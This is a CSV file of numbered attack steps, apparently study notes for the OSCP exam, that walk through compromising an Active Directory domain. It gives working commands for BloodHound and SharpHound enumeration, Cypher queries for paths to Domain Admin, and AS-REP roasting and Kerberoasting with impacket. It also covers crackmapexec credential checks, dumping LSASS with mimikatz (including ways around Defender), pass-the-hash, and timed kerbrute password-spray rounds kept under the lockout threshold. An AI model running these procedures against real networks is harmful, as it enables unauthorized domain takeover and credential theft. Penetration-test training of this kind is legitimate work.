"id","name","objective","description","expected_output","notes"
"authenticate-domain","Authenticate to Domain with Valid Credentials","Establish authenticated domain user session required for LDAP queries and data collection","REQUIREMENT: Valid domain user credentials.
ANY domain user can run BloodHound - no special privileges required. Even low-privilege standard user accounts can enumerate complete domain structure via LDAP queries.

AUTHENTICATION METHODS:

LINUX (bloodhound-python):
Credentials provided via command line:
bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All --zip

Password prompted interactively OR provided inline.
Alternative: Use NTLM hash with -hashes flag OR Kerberos ticket with -k flag.

WINDOWS (SharpHound.exe):
Use current user session (if domain-joined) OR runas /netonly /user:<DOMAIN>\<USERNAME> cmd.exe to inject credentials.
SharpHound.exe automatically uses current session context - no credential parameters needed.

VERIFICATION:

Linux: bloodhound-python -u pete -p 'Nexus123!' -d corp.com -ns 192.168.223.70 -c All --zip
Expected: 'Resolved Collection Methods: ...' (authentication successful)
Failure: 'Could not connect to LDAP' OR 'Authentication failed' (check credentials/DC IP)

Windows: whoami /groups (should show domain groups like 'DOMAIN USERS')

TIME SYNC CRITICAL:
Kerberos authentication requires time sync within 5 minutes of DC.
Fix clock skew: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>
Verify: date (check time matches DC time closely)
Error without sync: KRB_AP_ERR_SKEW (Clock skew too great)

COMMON FAILURES:

1. STATUS_LOGON_FAILURE:
Cause: Invalid credentials, wrong domain, or account locked.
Solution: Verify credentials with crackmapexec smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN>

2. Connection timeout:
Cause: DC unreachable or LDAP port blocked.
Solution: Test connectivity: nc -zv <DC_IP> 389 (LDAP) AND nc -zv <DC_IP> 636 (LDAPS)

3. KDC_ERR_C_PRINCIPAL_UNKNOWN:
Cause: Wrong username or domain name.
Solution: Check domain name: nslookup <DC_IP> (should return domain FQDN)

OSCP TIP: Test authentication BEFORE starting BloodHound collection to avoid wasting time. 30 seconds validation saves 5 minutes troubleshooting failed collection.

TIME ESTIMATE: 1-2 minutes (includes time sync and verification).","",""
"collect-bloodhound-data","Collect BloodHound Data with All Collection Methods","Execute BloodHound data collection to enumerate users, computers, groups, sessions, trusts, and ACLs","COLLECTION METHODS:

bloodhound-python (Linux - RECOMMENDED for OSCP):
bloodhound-python -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All --zip

Flags explained:
-c All: Collect ALL data (users, groups, computers, sessions, trusts, ACLs, containers)
--zip: Automatically create ZIP file for easy upload (bh.zip)
-ns <DC_IP>: Specify DNS server (use DC IP for reliable resolution)

Output:
[*] Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, Container
[*] Connecting to LDAP server: dc01.corp.com
[+] Done in 00M 45S
[*] Compressing output into bh.zip

Result: bh.zip file created (500KB-5MB depending on domain size)
Contains: users.json, computers.json, groups.json, sessions.json, trusts.json, acls.json, containers.json

SharpHound.exe (Windows - if RDP/WinRM access):
SharpHound.exe -c All --zipfilename bh.zip

Advantages over bloodhound-python:
- Collects local admin sessions (bloodhound-python uses LDAP only, misses some sessions)
- Faster for large domains (native C# vs Python)

Disadvantages:
- Requires Windows code execution (may trigger AV)
- Requires file transfer to Kali for analysis

COLLECTION SCOPES:

-c All: COMPLETE collection (recommended - only 5 extra seconds vs partial)
-c Session: ONLY user sessions (fast but incomplete)
-c DCOnly: Domain Controller data only (excludes workstation sessions - NOT recommended)

CRITICAL FOR OSCP: ALWAYS use -c All. Session data is CRITICAL for finding Domain Admin credentials cached on workstations (the service session pattern from writeup). DCOnly collection MISSES this goldmine.

TROUBLESHOOTING:

1. 'Could not resolve domain':
Cause: DNS resolution failing.
Solution: Use -ns flag with DC IP: -ns 192.168.223.70

2. 'No session data collected':
Cause: bloodhound-python limitation (LDAP-based, doesn't enumerate all sessions).
Solution: Use SharpHound.exe if Windows access available OR accept reduced session data.
Alternative: Manual session enumeration: crackmapexec smb <SUBNET> -u <USER> -p '<PASS>' --sessions

3. Collection hangs:
Cause: Large domain (1000+ users) or network latency.
Solution: Wait (can take 5-10 minutes for very large domains) OR use --dns-tcp flag for stability.

4. Partial data (empty users.json):
Cause: Insufficient LDAP permissions OR wrong base DN.
Solution: Verify authentication successful, try --dns-tcp, check LDAP not blocked.

DATA VERIFICATION:

unzip -l bh.zip
Expected files:
users.json (100KB-1MB)
computers.json (50KB-500KB)
groups.json (50KB-200KB)
sessions.json (10KB-100KB)
trusts.json (small, <10KB)
acls.json (large, 1MB-10MB)

Quick check:
jq '.data | length' users.json
Expected: 10+ users (small domain) to 1000+ users (large domain)
If 0: Collection failed, troubleshoot authentication/LDAP access.

OSCP EXAM SCENARIO: Small domain (10-50 users, 5-20 computers). Collection completes in 30-90 seconds. Output file <1MB.

TIME ESTIMATE: 30 seconds - 2 minutes (OSCP typical), up to 10 minutes (large corporate domains).","",""
"upload-to-bloodhound","Upload Data to BloodHound GUI and Verify Ingestion","Import collected JSON data into Neo4j database via BloodHound GUI for graph analysis","PREREQUISITE: Neo4j running and BloodHound GUI launched.

Start Neo4j:
sudo neo4j start
Verify: sudo neo4j status (should show 'active (running)')
Default credentials: neo4j:neo4j (change on first login)

Start BloodHound GUI:
bloodhound
Login: neo4j / <your_password>
Expected: BloodHound interface opens with 'Upload Data' button.

UPLOAD PROCESS:

1. Click 'Upload Data' button (top-right, database icon with up arrow)
2. Select bh.zip file OR drag-and-drop ZIP file into window
3. Ingestion begins automatically

Ingestion Output:
[*] Processing users.json
[+] Imported 25 users
[*] Processing computers.json
[+] Imported 8 computers
[*] Processing groups.json
[+] Imported 12 groups
[*] Processing sessions.json
[+] Imported 45 sessions
[*] Processing trusts.json
[+] Imported 0 trusts (no domain trusts in small domains - normal)
[*] Processing acls.json
[+] Imported 1250 ACL relationships

Expected completion: 10-30 seconds for OSCP-sized domain.

VERIFICATION:

Database Info (bottom-left icon):
- Users: 25 (should match 'jq '.data | length' users.json')
- Computers: 8
- Groups: 12
- Sessions: 45
- ACLs: 1250
- Relationships: ~1500-2000 total

If counts are 0: Upload failed, data not ingested.

Search bar test:
Type a known username (e.g., 'pete' from enumeration).
Expected: User node appears, click to view properties.
Properties show: name, domain, enabled, description, password last set, etc.

CRITICAL: CLEAR OLD DATA BEFORE NEW UPLOADS

Problem: Previous lab domains still in database cause confusion.
Symptom: Queries return results from WRONG domain.

Solution:
Database Info → Clear Database → Confirm
Waits 5-10 seconds for deletion.
Verify: All counts show 0.
Then upload new domain data.

OSCP EXAM TIP: Clear database at START of each AD target. Prevents cross-contamination between exam machines.

TROUBLESHOOTING:

1. 'Could not connect to Neo4j':
Cause: Neo4j not running OR wrong credentials.
Solution: sudo neo4j status, verify running. Reset password if needed: sudo neo4j-admin set-initial-password <newpass>

2. Upload hangs or fails:
Cause: Large JSON files (>10MB) OR corrupted ZIP.
Solution: Extract ZIP, upload individual JSON files: Upload Data → select users.json, then computers.json, etc.
Alternative: Increase Neo4j heap memory in /etc/neo4j/neo4j.conf: dbms.memory.heap.max_size=2G

3. Zero nodes imported:
Cause: Empty JSON files (collection failed in step 2).
Solution: Return to step 2, troubleshoot collection, re-collect data.

4. Partial import (users imported but no sessions):
Cause: sessions.json empty (bloodhound-python limitation) OR excluded from collection.
Solution: Re-collect with -c All flag. If still empty, accept reduced session data (common with bloodhound-python).

MANUAL VERIFICATION QUERIES:

Database Info → Raw Query (bottom icon, </> symbol)

Test query 1 (count users):
MATCH (u:User) RETURN count(u)
Expected: Same count as Database Info

Test query 2 (list users):
MATCH (u:User) RETURN u.name LIMIT 10
Expected: User list appears (pete@corp.com, mike@corp.com, etc.)

Test query 3 (check sessions):
MATCH (c:Computer)<-[:HasSession]-(u:User) RETURN c.name, u.name LIMIT 10
Expected: Computer-user session pairs.
If empty: No sessions imported (bloodhound-python limitation OR -c Session not used).

TIME ESTIMATE: 30 seconds - 2 minutes (upload + verification).","",""
"analyze-prebuilt-queries","Run Pre-Built Queries to Find Privilege Escalation Paths","Execute BloodHound's built-in queries to identify shortest paths to Domain Admins from compromised users","PRE-BUILT QUERY WORKFLOW:

BloodHound provides ~40 pre-built queries organized by attack category.
Access: Three horizontal lines icon (top-left) → Analysis

CRITICAL FIRST STEP: Mark compromised users as 'Owned'.

Search bar → type compromised username (e.g., 'pete').
Right-click user node → 'Mark User as Owned' (node turns red skull icon).
Repeat for ALL compromised accounts (pete, mike, dave, etc.).

WHY: 'Owned Principals' queries ONLY work if users marked as owned.

PRIMARY QUERY: Shortest Paths to Domain Admins from Owned Principals

Location: Analysis → Domain → 'Shortest Paths to Domain Admins from Owned Principals'

Expected behavior:

SUCCESS SCENARIO (uncommon for standard users):
Graph displays: owned_user → [relationship chain] → Domain Admins group
Relationship examples:
- pete → MemberOf → IT Admins → AdminTo → DC01 → Domain Admins
- mike → GenericAll → sql_service → MemberOf → Domain Admins

FAILURE SCENARIO (COMMON - this is NORMAL):
'No Data Returned'
OR
Graph shows owned user node with NO connections to Domain Admins.

CRITICAL OSCP LESSON: This does NOT mean no path exists!

From Corp-DCSync writeup:
pete@corp.com marked as owned.
Query: 'Shortest Paths to Domain Admins from Owned Principals'
Result: NO DATA RETURNED

Interpretation: pete has no DIRECT privilege escalation path.
pete is standard domain user with no AdminTo, GenericAll, or other exploitable permissions to privileged accounts.

SOLUTION: Proceed to step 5 (custom Cypher queries) to find INDIRECT paths.

ALTERNATIVE PRE-BUILT QUERIES (try these if primary fails):

1. Find Workstations where Domain Users can RDP:
Analysis → Domain → 'Find Workstations where Domain Users can RDP'
Looks for: (Domain Users group) → CanRDP → (Computer)
Use case: If compromised user can RDP to workstation, gain interactive access for credential dumping.

2. Find Computers where Domain Users are Local Admin:
Analysis → Domain → 'Find Computers where Domain Users are Local Admin'
Looks for: (Domain Users group) → AdminTo → (Computer)
Use case: If compromised user has local admin, can use PSExec/WinRM for SYSTEM shell.

3. Shortest Paths to High Value Targets:
Analysis → Pathfinding → 'Shortest Paths to High Value Targets'
Select: Start node = owned user, End node = Domain Admins
Looks for: ANY relationship chain, not just 'shortest'.
May reveal longer paths missed by 'Shortest Paths' query.

4. Find Principals with DCSync Rights:
Analysis → Domain → 'Find Principals with DCSync Rights'
Looks for: Users/groups with DS-Replication-Get-Changes permissions.
Use case: If owned user has DCSync rights (rare), instant domain compromise.

QUERY INTERPRETATION:

EDGE TYPES (relationship types between nodes):

- AdminTo: Local administrator on computer (CAN: PSExec, WinRM, WMI for SYSTEM shell)
- MemberOf: Group membership (CAN: Inherit group privileges)
- HasSession: User logged into computer (CAN: Credential harvest with mimikatz if you're local admin)
- GenericAll: Full control over object (CAN: Change password, add to groups, modify ACLs)
- WriteDACL: Write ACL permissions (CAN: Grant yourself GenericAll)
- WriteOwner: Change object owner (CAN: Make yourself owner, then WriteDACL, then GenericAll)
- AllExtendedRights: All extended rights (CAN: Force-ChangePassword, Read LAPS password)
- ForceChangePassword: Reset user password (CAN: Change password, authenticate as user)

ATTACK PATH EXAMPLES:

Example 1 (Direct):
pete → AdminTo → FILE01 → HasSession → maria (Domain Admin)
Attack: PSExec to FILE01 as pete → mimikatz dumps maria's credentials → Pass-the-Hash as Domain Admin.

Example 2 (Indirect):
pete → MemberOf → Help Desk → ForceChangePassword → sql_service → MemberOf → Domain Admins
Attack: Reset sql_service password (Help Desk privilege) → Authenticate as sql_service → Domain Admin access.

Example 3 (ACL Abuse):
pete → WriteDACL → IT_Admin group → MemberOf → Domain Admins
Attack: Grant GenericAll to IT_Admin group → Add pete to IT_Admin → Domain Admin via group membership.

TIME BUDGET: 5 minutes MAXIMUM for pre-built queries.

If no clear path after 5 minutes → Proceed to custom Cypher queries (step 5).
Don't waste time clicking through every pre-built query - most won't apply to your scenario.

TIME ESTIMATE: 2-5 minutes (mark owned, run queries, interpret results).","",""
"custom-cypher-queries","Execute Custom Cypher Queries to Find Hidden Attack Paths","Use custom Cypher queries to discover privilege escalation paths missed by pre-built queries","WHEN TO USE CUSTOM QUERIES:

Pre-built query returned 'No Data' (step 4 failed).
Owned user is standard domain user with no direct privilege escalation path.

CRITICAL PATTERN from writeup:
pete@corp.com: Pre-built query found NO path.
Custom query revealed: mike@corp.com (another standard user) has AdminTo → CLIENT75.
Second query: CLIENT75 has HasSession → maria@corp.com (Domain Admin).
ATTACK PATH: pete → enumerate users → mike credentials → lateral movement to CLIENT75 → mimikatz dumps maria → Domain Admin.

This path is INVISIBLE to 'Shortest Paths' query because pete doesn't have the AdminTo relationship - mike does.

CUSTOM CYPHER QUERY ACCESS:

BloodHound GUI: Bottom-left icon (</> symbol) → 'Raw Query'
OR
Search bar: Type advanced Cypher syntax directly.

QUERY 1: Find systems where compromised user has local admin

MATCH (u:User {name:'PETE@CORP.COM'})-[:AdminTo]->(c:Computer)
RETURN u,c

Replace 'PETE@CORP.COM' with your owned username (UPPERCASE, include @DOMAIN.COM).

Expected results:
SUCCESS: Graph shows pete → AdminTo → [list of computers]
Example: pete → AdminTo → WORKSTATION01, WORKSTATION02
Action: Can PSExec/WinRM to these systems for SYSTEM shell.

NO RESULTS: pete has no local admin rights on any systems.
Action: Try Query 2 (test other compromised users).

QUERY 2: Find systems where ANOTHER user has local admin

MATCH (u:User {name:'MIKE@CORP.COM'})-[:AdminTo]->(c:Computer)
RETURN u,c

Replace 'MIKE' with other domain users found during enumeration (dave, jeff, stephanie, etc.).

Corp-DCSync example:
Query for mike: FOUND → mike → AdminTo → CLIENT75.CORP.COM
This is the BREAKTHROUGH - mike has access even though pete doesn't.

Action: Obtain mike's credentials (password spray, AS-REP roasting, Kerberoasting) → lateral movement to CLIENT75.

QUERY 3: Find Domain Admin sessions on discovered computers

MATCH (c:Computer {name:'CLIENT75.CORP.COM'})<-[:HasSession]-(u:User)
RETURN c,u

Replace 'CLIENT75.CORP.COM' with computer from Query 2.

Expected results:
SUCCESS: Graph shows CLIENT75 ← HasSession ← [list of users]
Example: CLIENT75 ← HasSession ← maria@CORP.COM, dave@CORP.COM

Check user properties:
Click maria node → Properties → memberOf: 'DOMAIN ADMINS@CORP.COM'

CRITICAL DISCOVERY: Domain Admin has session on workstation!
Session type in properties: 'Session: Service from 0' (service account - persists until reboot).

Action: Lateral movement to CLIENT75 with mike credentials → mimikatz dumps maria's Domain Admin credentials → escalate to Domain Admin.

QUERY 4: Find ALL sessions on a computer (broader search)

MATCH (c:Computer {name:'CLIENT75.CORP.COM'})<-[:HasSession]-(u:User)
RETURN c.name, u.name, u.description

Returns: Computer name, username, user description (shows group memberships).
Useful for: Identifying non-admin high-value users (SQL admins, backup operators, etc.).

QUERY 5: Find privilege escalation through group membership

MATCH (u:User {name:'PETE@CORP.COM'})-[:MemberOf*1..3]->(g:Group {name:'DOMAIN ADMINS@CORP.COM'})
RETURN p

*1..3 = traverse 1 to 3 group memberships.
Example path: pete → MemberOf → IT Admins → MemberOf → Server Operators → MemberOf → Domain Admins

Likely result: NO PATH (standard users not in privileged groups).
But worth checking - may find nested group memberships missed by pre-built queries.

QUERY 6: Find computers where Domain Users group has RDP or admin access

MATCH (g:Group {name:'DOMAIN USERS@CORP.COM'})-[:CanRDP|AdminTo]->(c:Computer)
RETURN g,c

|CanRDP|AdminTo| = match EITHER relationship type.
Useful: If Domain Users group over-privileged (common misconfiguration).

QUERY 7: Find users with DCSync rights

MATCH (u:User)-[:GetChanges|GetChangesAll]->(d:Domain)
RETURN u.name

Finds: Users with DS-Replication-Get-Changes permissions (can perform DCSync).
Rare for standard users, but if found = instant domain compromise.

QUERY ITERATION STRATEGY:

1. Query owned user (pete) for AdminTo → If NONE, go to step 2.
2. Query OTHER users (mike, dave, jeff, etc.) for AdminTo → Find systems with admin access.
3. Query discovered systems for HasSession → Find high-value users (Domain Admins).
4. Verify exploitable path: Can you obtain credentials for user with AdminTo? Can you access system with HasSession?
5. Document attack chain: owned_user → intermediate_user credentials → lateral movement → credential harvest → privilege escalation.

MANUAL JSON PARSING ALTERNATIVE (if BloodHound GUI unavailable):

jq '.data[] | select(.Properties.name==""PETE@CORP.COM"") | .Aces' users.json
Shows: ACL permissions for pete (GenericAll, WriteDACL, etc.).

jq '.data[] | select(.Properties.serviceprincipalnames != null) | .Properties.name' users.json
Shows: Users with SPNs (Kerberoasting targets).

jq '.data[] | select(.Properties.dontreqpreauth == true) | .Properties.name' users.json
Shows: Users with pre-auth disabled (AS-REP roasting targets).

TROUBLESHOOTING:

1. Query returns syntax error:
Cause: Wrong Cypher syntax OR wrong node/relationship name.
Solution: Copy query EXACTLY from examples, replace only username/computer name. Node names case-sensitive: User not user.

2. Query returns no results:
Cause: User/computer name wrong OR relationship doesn't exist.
Solution: Verify name with search bar first. Check spelling and domain (PETE@CORP.COM not PETE).

3. Don't understand graph results:
Cause: Need to learn edge types.
Solution: Click relationship edge → Properties shows relationship type. Read BloodHound edge documentation.

4. Too many results:
Cause: Query too broad.
Solution: Add LIMIT clause: MATCH ... RETURN ... LIMIT 10

OSCP EXAM STRATEGY:

Test top 5 users from enumeration (most common usernames: admin, administrator, user, backup, service).
Test top 5 computers (DCs, file servers, SQL servers most likely to have admin sessions).
Don't spend >10 minutes on custom queries - if no path found, proceed with credential attacks (Kerberoasting, AS-REP roasting, password spray).

TIME ESTIMATE: 5-10 minutes (iterate through 5-10 custom queries).","",""
"validate-attack-path","Validate Discovered Attack Path is Exploitable","Verify the BloodHound-discovered attack path is feasible and systems are accessible","VALIDATION CHECKLIST:

From Corp-DCSync example, discovered path:
mike@CORP.COM → AdminTo → CLIENT75.CORP.COM → HasSession → maria@CORP.COM (Domain Admin)

Validation steps:

1. VERIFY SYSTEM ACCESSIBLE:

Ping test:
ping -c 3 192.168.223.75
Expected: Reply from 192.168.223.75
Failure: Request timeout (system offline or firewall blocking ICMP).

Port scan:
sudo nmap -p 445,5985,5986 -Pn 192.168.223.75
Expected:
445/tcp open (SMB - for PSExec)
5985/tcp open (WinRM - for Evil-WinRM)
OR 5986/tcp open (WinRM HTTPS)

Failure: Ports filtered (firewall blocking lateral movement protocols).
Alternative: Try RDP (3389), WMI (135), or DCOM (varies).

2. VERIFY USER CREDENTIALS OBTAINABLE:

From BloodHound: Need mike@CORP.COM credentials for CLIENT75 access.

Check if credentials already known:
grep -i 'mike' /path/to/credentials.txt

If NOT known, plan credential acquisition:

Option A: Password spray (if password policy allows):
crackmapexec smb 192.168.223.70 -u mike -p password_list.txt -d corp.com
Risk: Account lockout if threshold exceeded.

Option B: AS-REP roasting (if mike has pre-auth disabled):
impacket-GetNPUsers corp.com/mike -no-pass -dc-ip 192.168.223.70
Success: Returns AS-REP hash for offline cracking.

Option C: Kerberoasting (if mike has SPN):
impacket-GetUserSPNs corp.com/pete:Nexus123! -request | grep mike
Success: Returns TGS hash for offline cracking.

Option D: Credential reuse from other compromises:
Test known passwords: crackmapexec smb 192.168.223.70 -u mike -p 'Nexus123!' (try pete's password).

Corp-DCSync result: mike's password = Darkness1099! (obtained via password spray).

3. VERIFY ADMIN ACCESS TO SYSTEM:

Test credentials:
crackmapexec smb 192.168.223.75 -u mike -p 'Darkness1099!' -d corp.com

Expected output:
[+] 192.168.223.75:445 CLIENT75 [+] corp.com\mike:Darkness1099! (Pwn3d!)
       ^^^^^^^^ (Pwn3d!) indicator = local admin access CONFIRMED.

Failure outputs:
[+] corp.com\mike:Darkness1099! (no Pwn3d): Valid credentials but NOT local admin.
Solution: BloodHound data wrong OR permissions changed. Find alternative system.

[-] STATUS_LOGON_FAILURE: Invalid credentials.
Solution: Password wrong OR account locked. Re-verify credentials.

4. VERIFY SESSION EXISTS (optional but recommended):

From Kali:
crackmapexec smb 192.168.223.75 -u mike -p 'Darkness1099!' -d corp.com --sessions

Expected output:
corp.com\maria (Domain Admin session present)

Failure: No sessions OR maria logged off.
Solution: Session data may be stale (BloodHound collection was hours/days ago). User may have logged off.
Alternative: Proceed with credential dump anyway - cached credentials persist even after logoff.

From Windows (if RDP/WinRM access):
quser
OR
query user

Shows: Currently logged-on users (interactive sessions only, doesn't show service sessions).

5. VERIFY MIMIKATZ CAN RUN (if AV present):

Test on compromised system first (if you have another Windows access):
.\mimikatz.exe ""exit""

Expected: Mimikatz banner, then exits.
Failure: File deleted immediately (Windows Defender detected and quarantined).
Solution: Use alternative (Invoke-Mimikatz PowerShell in-memory, procdump + pypykatz, disable Defender).

PATH VALIDATION DECISION TREE:

System accessible + Credentials obtainable + Admin access confirmed = PROCEED TO EXPLOITATION (proceed to attack)

System accessible + Credentials obtainable + Admin access DENIED = BloodHound data wrong, find alternative path

System accessible + Credentials NOT obtainable = Plan credential acquisition (password spray, AS-REP/Kerberoast, credential reuse)

System NOT accessible = System offline or firewalled, find alternative path

DOCUMENTATION:

Create attack plan file:
echo ""ATTACK PATH VALIDATION"" > attack_plan.txt
echo """" >> attack_plan.txt
echo ""Target: CLIENT75.CORP.COM (192.168.223.75)"" >> attack_plan.txt
echo ""Access: mike@CORP.COM (Darkness1099!) - LOCAL ADMIN"" >> attack_plan.txt
echo ""Objective: Dump maria@CORP.COM (Domain Admin) credentials from LSASS"" >> attack_plan.txt
echo ""Method: Evil-WinRM → Upload Mimikatz → privilege::debug → sekurlsa::logonpasswords"" >> attack_plan.txt
echo ""Expected: maria NTLM hash → Pass-the-Hash to DC → Domain Admin access"" >> attack_plan.txt

OSCP EXAM TIP: Validation prevents wasting time on dead-end attack paths. 5 minutes validation saves 30 minutes failed exploitation attempts.

TIME ESTIMATE: 3-5 minutes (connectivity checks, credential verification, admin access confirmation).","",""
"discover-policy-detailed","Discover and Document Password Policy in Detail","Retrieve complete password policy and document all lockout-related settings for calculation","Use appropriate method based on position: net-accounts-policy (Windows), crackmapexec-policy (Linux+creds), enum4linux-policy (Linux+null session), or ldapsearch-policy (LDAP). DOCUMENT THESE VALUES: (1) Lockout threshold (e.g., 5). (2) Lockout observation window (e.g., 30 minutes). (3) Lockout duration (e.g., 30 minutes). (4) Minimum password length (helps craft password list). (5) Password complexity (helps understand requirements). CREATE SPRAY LOG: Set up tracking spreadsheet or file with columns: Username, Password1_Time, Password2_Time, Password3_Time, Total_Attempts, Status. This log prevents accidental re-spraying of users who've already received max attempts.","",""
"calculate-safe-limits","Calculate Conservative Safe Spray Limits","Determine maximum safe attempts per user with safety margin to prevent lockouts","CONSERVATIVE CALCULATION (Ultra-Safe): Safe attempts = Lockout threshold - 2. Example: threshold 5 → spray 3 passwords max (not 4). This provides TWO layers of safety: (1) -1 for user's own failed login attempts. (2) -1 for timing uncertainty and network delays. OBSERVATION WINDOW BUFFER: Add 5 minutes to observation window for safety. Example: 30min window → wait 35min between spray rounds. Why? Clock skew between attacker and DC, network delays, ensure counter fully resets. TOTAL PASSWORD LIMIT: Calculate how many passwords you can safely test in available time. Formula: max_passwords = (available_time_minutes - spray_time) / (observation_window + buffer). Example: 3 hour exam window, 30min observation window → max 5 passwords total (5 × 35min = 175min = 2h55m). DOCUMENT: Write these values in spray log header for reference.","",""
"prepare-username-list","Enumerate and Prepare Username List","Build validated username list and pre-populate spray log","Enumerate valid usernames using kerbrute-userenum-ad (fastest, most reliable). Save results to users.txt. SPRAY LOG SETUP: Add each validated username to spray log with empty timestamp columns. This creates accountability for each spray round. OPTIONAL FILTERING: Consider filtering list: (1) Exclude administrator and krbtgt (high-value, closely monitored). (2) Exclude service accounts if identifiable (often have complex passwords). (3) Focus on standard user accounts. (4) Prioritize accounts with description fields suggesting human users (not computers/services). REASONING: Fewer targets = faster spray rounds = more passwords testable in time budget. For exam: 20-50 users is manageable, 200+ users takes too long with safe timing.","",""
"spray-round-1","Spray Round 1 - First Password Attempt","Test first common password against all users with full logging","SELECT PASSWORD: Choose most common default password. Examples: Password123!, Welcome2023!, CompanyName2023! (replace CompanyName with actual org name from OSINT). EXECUTE SPRAY: Use kerbrute passwordspray (fastest, stealthiest). COMMAND: kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Password123!'. LOG RESULTS: Immediately update spray log: (1) Add timestamp in Password1_Time column for all users. (2) Mark successful authentications with username:password in Status column. (3) Increment Total_Attempts counter for each user. (4) Note any errors or anomalies. SET TIMER: Start countdown timer for (observation_window + buffer) minutes. Example: 30min window + 5min buffer = 35 minute timer. DO NOT spray again until timer expires.","",""
"validate-round-1-creds","Validate Round 1 Found Credentials (If Any)","Immediately validate and leverage any credentials found in Round 1","IF VALID CREDENTIALS FOUND in Round 1: Don't wait for next round - immediately leverage them. VALIDATION: Use kerbrute-validate-creds or crackmapexec-validate-admin to confirm credentials work. DECISION POINT: (1) If credentials give local admin access (Pwn3d!) → proceed to lateral movement, objective achieved, spray chain can stop. (2) If credentials are standard user → use for AD enumeration (may find more attack vectors), then continue spray chain for additional credentials. (3) If no credentials found in Round 1 → proceed to wait-observation-window-1 step. TIME MANAGEMENT: If exam, evaluate: is local admin access sufficient for objective? Or need more credentials? Don't waste time spraying if objective is met.","",""
"wait-observation-window-1","Wait for Observation Window to Reset (Round 1 → 2)","Wait full observation window + buffer to ensure failed attempt counter resets","WAIT TIME: Observation window (from policy) + 5 minute buffer. Example: 30min + 5min = 35 minutes total. CRITICAL: Wait time is measured from LAST spray attempt completion (end of spray-round-1 step). Use timer app or alarm. DO NOT spray early - even 1 minute early could result in lockout if clocks are not synchronized. PRODUCTIVE USE OF WAIT TIME: (1) Validate credentials from Round 1 if found. (2) Enumerate AD with found credentials. (3) Perform non-password attacks (Kerberoasting, AS-REP roasting). (4) Search file shares for passwords. (5) Plan next password choices. (6) Review spray log for accuracy. WHEN TIMER EXPIRES: Proceed to spray-round-2. Update spray log to note observation window completion.","",""
"spray-round-2","Spray Round 2 - Second Password Attempt","Test second common password after observation window reset","VERIFY WAIT COMPLETE: Confirm timer expired and observation window + buffer elapsed. SELECT PASSWORD #2: Choose different password from Round 1. Examples: Welcome2023!, Summer2023!, Winter2023!, Company123! (vary by season, year, company name). EXECUTE SPRAY: Same method as Round 1 - kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Welcome2023!'. LOG RESULTS: Update spray log Password2_Time column with timestamps. Update Total_Attempts counter (should show 2 for all users now). Document any successful authentications. SET TIMER AGAIN: Start (observation window + buffer) timer for Round 2 → 3 transition. ALERT CHECK: Monitor for any lockout alerts or defensive responses. If any user locked out - ABORT spray chain immediately.","",""
"validate-round-2-creds","Validate Round 2 Found Credentials","Validate credentials from Round 2 and evaluate if additional rounds needed","IF CREDENTIALS FOUND in Round 2: Validate immediately with crackmapexec-validate-admin. Check for local admin rights. CUMULATIVE EVALUATION: Review credentials from Round 1 + Round 2. Questions: (1) Do you have local admin anywhere? (2) Do you have enough access for objectives? (3) Is additional spraying worth the time investment? DECISION MATRIX: [Local admin found] → Stop spray chain, proceed to lateral movement. [Multiple standard user accounts found] → Evaluate if enough for AD enumeration and Kerberoasting. [Zero credentials found] → Continue spray chain to Round 3. TIME BUDGET CHECK: Calculate remaining time and how many more rounds possible. Example: 60min left, 35min per round = 1 more round maximum.","",""
"wait-observation-window-2","Wait for Observation Window to Reset (Round 2 → 3)","Wait full observation window + buffer before Round 3","SAME PROCESS as wait-observation-window-1. Wait (observation window + buffer) minutes. CRITICAL ASSESSMENT: At this point you've invested 70+ minutes (2 spray rounds + 2 wait periods). Evaluate: (1) Is objective achievable with current access? (2) Is additional spraying worth remaining time? (3) Should pivot to other attack methods? ALTERNATIVE ATTACKS: Use wait time for: Kerberoasting (crack service account tickets offline), AS-REP roasting, ACL abuse hunting, GPP password searches, SMB share enumeration. SPRAY LOG REVIEW: Verify Total_Attempts column shows 2 for all users. Ensure no users accidentally sprayed 3 times (would risk lockout in Round 3).","",""
"spray-round-3","Spray Round 3 - Third Password Attempt (Final Safe Round)","Test third password - final round before reaching conservative safe limit","FINAL ROUND: With threshold-2 calculation, Round 3 is the LAST safe spray for threshold 5 (3 attempts). Do not proceed to Round 4 without re-evaluating risk. SELECT PASSWORD #3: Choose third distinct password. Examples: Spring2023!, Autumn2023!, Password1, Passw0rd!. EXECUTE SPRAY: kerbrute passwordspray with Password #3. LOG METICULOUSLY: Update spray log Password3_Time column. Total_Attempts should now be 3 for all users. This is AT the conservative safe limit. FINAL VALIDATION: Immediately validate any credentials found. Evaluate total credential haul: Round 1 + 2 + 3 results. DECISION POINT: Stop here (recommended) or risk Round 4 with reduced safety margin (threshold-1 instead of threshold-2).","",""
"final-validation-and-exploitation","Final Credential Validation and Exploitation","Consolidate all found credentials and execute optimal exploitation path","CONSOLIDATE RESULTS: Review spray log for all successful authentications from Rounds 1-3. VALIDATE ALL: Use crackmapexec-validate-admin to scan subnet with each credential pair. Create matrix: Username × Systems → show which users have admin on which systems. PRIORITIZE: (1) Credentials with most (Pwn3d!) systems = best pivot. (2) Credentials with server access (higher privilege data). (3) Credentials with no admin = use for AD enumeration. EXPLOITATION: Execute lateral movement to (Pwn3d!) systems, dump SAM/LSA/LSASS, extract additional credentials, search for Domain Admin cached creds or Kerberos tickets. OSCP SUCCESS: Local admin on any system is usually sufficient for initial foothold objective. Proceed to privilege escalation and post-exploitation.","",""
